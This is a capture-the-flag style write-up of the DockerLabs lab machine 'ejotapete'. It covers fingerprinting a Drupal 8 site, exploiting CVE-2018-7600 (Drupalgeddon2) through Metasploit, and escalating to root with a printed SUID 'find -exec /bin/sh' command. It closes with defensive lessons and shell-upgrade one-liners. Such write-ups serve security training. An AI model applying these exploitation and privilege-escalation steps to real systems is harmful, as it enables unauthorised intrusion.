**ejotapete** is an easy DockerLabs machine that hosts a vulnerable **Drupal 8** CMS exposed under `/drupal/`. The attack chain exploits **CVE-2018-7600** (Drupalgeddon2) through Metasploit to obtain a Meterpreter shell as `www-data`, then escalates to `root` by abusing a SUID bit on `/usr/bin/find`.

### Fingerprinting the CMS

Navigating to `http://172.17.0.2/drupal/` and inspecting the page source reveals:

page source — version fingerprint

```
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)">
```

The generator meta tag confirms **Drupal 8**. Drupal 8 without patches is affected by **CVE-2018-7600** (Drupalgeddon2), a critical unauthenticated remote code execution vulnerability.

### Exploiting SUID find

`/usr/bin/find` has the SUID bit set and is owned by root. GTFOBins documents the classic abuse: passing `-exec` with `/bin/sh` spawns a shell inheriting find's effective UID (root).

GTFOBins — find SUID

```
www-data@3fa2eee8d27d$ find . -exec /bin/sh \; -quit

# whoami
root
```

## 05 Lessons Learned

L1

**CMS version disclosure is dangerous.** The `<meta name="Generator">` tag exposed the exact Drupal version, enabling immediate CVE lookup. In production, this header should be removed.

L2

**Unpatched CMS = trivial unauthenticated RCE.** CVE-2018-7600 is a critical N-day that has been public since 2018. Keeping Drupal (and any CMS) updated is non-negotiable.

L3

**SUID on common binaries is a systemic misconfiguration.** `find`, `vim`, `bash` and similar should never have the SUID bit set. Audit periodically with `find / -perm -4000 -user root 2>/dev/null`.

L4

**When Python is unavailable, `script` upgrades the TTY.** Always have fallback shell stabilization techniques ready: `script /dev/null -c bash`, `perl -e 'exec "/bin/bash"'`, or `socat`.

L5

**Metasploit autocheck saves time on known CVEs.** The module's built-in `AutoCheck` verified vulnerability before sending the payload — a good habit to let run rather than disabling it.
